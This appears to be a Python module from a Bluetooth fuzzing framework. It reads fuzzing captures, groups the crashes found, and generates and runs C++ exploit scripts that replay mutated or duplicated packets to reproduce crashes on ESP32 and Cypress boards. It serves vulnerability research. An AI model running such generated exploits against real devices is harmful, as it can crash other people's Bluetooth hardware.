import os
import time
from itertools import combinations
from string import Template

from capture_process import (
    BoardType,
    Crash,
    CypressCapture,
    ESP32Capture,
    FuzzedPacket,
    ProtocolType,
)
from utils import (
    calc_file_sha256,
    convert_packet_cpp_array,
    find_mutation_loc,
    logger,
    run_exploit,
)


class AutoExploiter:
    # capture and exploit logic should happen in this class
    def __init__(
        self,
        capture_path: str,
        protocol: ProtocolType,
        board: BoardType,
        *,
        use_cache: bool = True,
        esp32_log_path: str = "",
    ) -> None:
        if protocol == "bt":
            if board == "esp32":
                self.capture = ESP32Capture(capture_path, esp32_log_path, use_cache)
            elif board == "cypress":
                self.capture = CypressCapture(capture_path, use_cache)
            else:
                logger.error(
                    f"Auto Exploiter currently does not support {board} board."
                )
        elif protocol == "5g":
            # TODO: to be implemented
            pass
        else:
            logger.error(
                f"Auto Exploiter currently does not support {protocol} protocol."
            )

    def gen_exploit_script(self, trial_pkts: list[FuzzedPacket]):
        wd_filters_declaration = ""
        wd_filters_setup = ""
        wd_filter_registration = ""
        wd_filter_action = ""

        for idx, trial_pkt in enumerate(reversed(trial_pkts)):
            wd_filters_declaration += f"wd_filter_t f{idx+1};\n"
            wd_filters_setup += f"""f{idx+1} = wd_filter("{trial_pkt.filter}");\n    """
            wd_filter_registration += f"wd_register_filter(ctx->wd, f{idx+1});\n    "

            action = ""
            if trial_pkt.type == "mutation":
                mutations = ""
                for mutation in find_mutation_loc(
                    trial_pkt.prev_packet_bytes, trial_pkt.packet_bytes
                ):
                    mutations += f"        pkt_buf[{mutation[0]}] = {mutation[1]};\n"
                action = (
                    f"if (wd_read_filter(ctx->wd, f{idx+1}) && counter == {idx})"
                    "\n"
                    "    {"
                    "\n" + mutations + '        wd_log_y("Send mutated packet now");'
                    "\n"
                    f"        counter = {(idx+1)%len(trial_pkts)};"
                    "\n"
                    "        return 1;"
                    "\n"
                    "    }"
                    "\n"
                )
            elif trial_pkt.type == "duplication":
                if self.capture.protocol == "bt":
                    # bluetooth offset 4 + 7, the last byte is checksum which can be ignored
                    payload = trial_pkt.packet_bytes[4 + 7 : -1]
                else:
                    payload = trial_pkt.packet_bytes
                    logger.error("Please implement this")
                action = (
                    f"if (wd_read_filter(ctx->wd, f{idx+1}) && counter == {idx})"
                    "\n"
                    "    {"
                    "\n"
                    f"        static uint8_t packet[] = {convert_packet_cpp_array(payload)};"
                    "\n"
                    f"        m_send_packet(ctx, packet, {len(payload)}, 1);"
                    "\n"
                    '        wd_log_y("Sending duplicated packets now!!!");'
                    "\n"
                    f"        counter = {(idx+1)%len(trial_pkts)};"
                    "\n"
                    "    }"
                    "\n    "
                )
            else:
                logger.error(f"Unknown fuzzed packet type: {trial_pkt.type}")

            wd_filter_action += action

        exploit_template = Template(
            open(
                "/home/user/wdissector/modules/auto-exploiter/exploit_templates/exploit_bt.cpp.template",
                "r",
                encoding="utf8",
            ).read()
        )

        return exploit_template.substitute(
            wd_filters_declaration=wd_filters_declaration,
            wd_filters_setup=wd_filters_setup,
            wd_filter_registration=wd_filter_registration,
            wd_filter_action=wd_filter_action,
        )

    def exploit_script_generator(
        self,
        same_crashes: list[Crash],
        exploit_max_fuzzed_pkts: int,
        min_trial_pkts: int,
        max_trial_iter: int,
        max_trial_time: int,
    ):
        # Traverse in reverse because we want to try exploits from the packets that are
        # closest to the crash, but no need to try too far packets.
        # Example for packets range defined by max_trial_iter
        # packet:          (i-2)-th iteration
        # packet:          (i-2)-th iteration
        # packet:          (i-1)-th iteration      -------\
        # packet:          (i-1)-th iteration             |
        # packet:          i-th iteration                 | >> max_trial_iter = 2
        # packet:          i-th iteration                 |
        # crash happens at i-th iteration          -------/
        # Sometimes the crash happens in a completely new iteration where no fuzzed packets are inside.
        # In this scenario, problem will arise if num_iterations_to_try is set to 1, i.e. trial_pkts
        # is empty. Intuitively, the fuzzed packets in the previous iterations must have caused the
        # crash. Thus, trial_pkts needs to contain a minimum amount of packets.
        # TODO: min_trial_pkts might not be enough, as trial_pkts may need to include all packets from
        # previous iteration in the scenario mentioned above.
        # What if trial_pkts contain too many packets?
        for crash in same_crashes:
            start_time = time.time()  # for every single crash in same_crashes
            trial_pkts: list[FuzzedPacket] = []
            for fuzzed_pkt in reversed(crash.fuzzed_pkts):
                if len(trial_pkts) > min_trial_pkts and (
                    crash.iteration - fuzzed_pkt.iter >= max_trial_iter
                ):
                    break
                trial_pkts.append(fuzzed_pkt)

            for num_fuzzed_pkts in range(1, exploit_max_fuzzed_pkts + 1):
                for comb in combinations(range(len(trial_pkts)), num_fuzzed_pkts):
                    if time.time() - start_time > max_trial_time:
                        logger.error(
                            f"Maximum trial time has reached for crash located at {crash.pkt_loc}."
                        )
                        return

                    selected_trial_pkts = [trial_pkts[i] for i in comb]
                    # if num_fuzzed_pkts == 4:
                    #     a = [i.loc for i in selected_trial_pkts]
                    #     if a[0] == 1652:
                    #         continue
                    #     print([i.loc for i in selected_trial_pkts])
                    #     input()
                    # else:
                    #     continue
                    # TODO:
                    filename_suffix = "esp32"
                    exploit_script_name = f"bt_auto_fuzz_uni_{ '_'.join([str(i.loc) for i in selected_trial_pkts ]) }_w{num_fuzzed_pkts}_{filename_suffix}"
                    exploit_script = self.gen_exploit_script(selected_trial_pkts)
                    exploit_path = f"/home/user/wdissector2/modules/exploits/bluetooth/{exploit_script_name}.cpp"
                    with open(
                        exploit_path,
                        "w",
                        encoding="utf8",
                    ) as f:
                        f.write(exploit_script)
                    # time.sleep(1)  # for some reason, wait 1 second here
                    yield exploit_script_name, exploit_path

    def auto_exploit(
        self,
        same_crash_thresh: int,
        exploit_max_fuzzed_pkts: int,
        min_trial_pkts: int,
        max_trial_iter: int,
        max_trial_time: int,
        modem_timeout: int,
        exploit_timeout: int,
        *,
        exploit_running_dir: str,
        host_port: str,
        target: str,
        target_port: str,
        target_hub_port: int,
    ):
        start_time = time.time()
        self.capture.discover_capture_crashes()
        self.capture.assign_identifier_to_crashes()  # temp
        if len(self.capture.crashes) == 0:
            logger.info(f"No crash found in capture: {self.capture.path}.")
            return
        grouped_crashes = self.capture.group_crashes(same_crash_thresh)
        logger.info(
            f"Discovered {len(self.capture.crashes)} crashes, {len(grouped_crashes)} among them are unique."
        )

        for i in self.capture.crashes:
            if i.identifier == "not_found":
                logger.debug(f"No identifier found for crash at {i.pkt_loc}.")

        exploit_result: dict[str, tuple[str | None, str]] = {}
        for same_crashes in grouped_crashes:
            # if 1655 in [i.pkt_loc for i in same_crashes]:  # TODO: remove
            #     continue
            for exploit, exploit_path in self.exploit_script_generator(
                same_crashes,
                exploit_max_fuzzed_pkts,
                min_trial_pkts,
                max_trial_iter,
                max_trial_time,
            ):
                if exploit_result.get(calc_file_sha256(exploit_path)) is not None:
                    # TODO: it is confusing here
                    exploit_crash_id, prev_exploit_path = exploit_result[
                        calc_file_sha256(exploit_path)
                    ]
                    os.remove(exploit_path)
                    if exploit_crash_id is not None and self.capture.is_same_crash_id(
                        exploit_crash_id, same_crashes[0].identifier, same_crash_thresh
                    ):
                        logger.info(
                            f"Same crash triggered for crashes {[item.pkt_loc for item in same_crashes]} using {prev_exploit_path}."
                        )
                        break
                    continue
                log_path = f"/home/user/wdissector/modules/auto-exploiter/logs/bluetooth/{exploit}.log"
                run_exploit(
                    exploit,
                    modem_timeout,
                    exploit_timeout,
                    exploit_running_dir,
                    host_port,
                    target,
                    target_port,
                    target_hub_port,
                    log_path,
                )
                exploit_crash_id = self.capture.find_crash_identifier_from_run_log(
                    log_path
                )
                exploit_result[calc_file_sha256(exploit_path)] = (
                    exploit_crash_id,
                    exploit_path,
                )
                if exploit_crash_id is None:
                    os.remove(exploit_path)
                    os.remove(exploit_path.replace(".cpp", ".so"))
                    os.remove(exploit_path.replace(".cpp", ".o"))
                # TODO: should always use same_crashes[0].reason ?
                if exploit_crash_id is not None and self.capture.is_same_crash_id(
                    exploit_crash_id, same_crashes[0].identifier, same_crash_thresh
                ):
                    logger.info(
                        f"Same crash triggered for crashes {[item.pkt_loc for item in same_crashes]} using {exploit_path}."
                    )
                    break

        logger.info(f"Auto exploiter takes {time.time() - start_time:.3f} seconds.")
